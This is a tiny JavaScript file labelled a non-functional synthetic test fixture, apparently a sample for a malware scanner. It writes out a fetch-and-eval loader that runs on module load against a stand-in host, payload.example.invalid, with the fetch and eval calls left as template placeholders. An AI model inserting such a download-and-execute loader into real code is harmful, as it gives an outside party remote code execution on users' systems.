// SYNTHETIC TEST FIXTURE — not functional
const axios = require("axios");

function load(url) {
  {{AXIOS_GET}}(url).then((r) => {{EVAL}}(r.data));
}

module.exports = load;

load("https://payload.example.invalid/m");
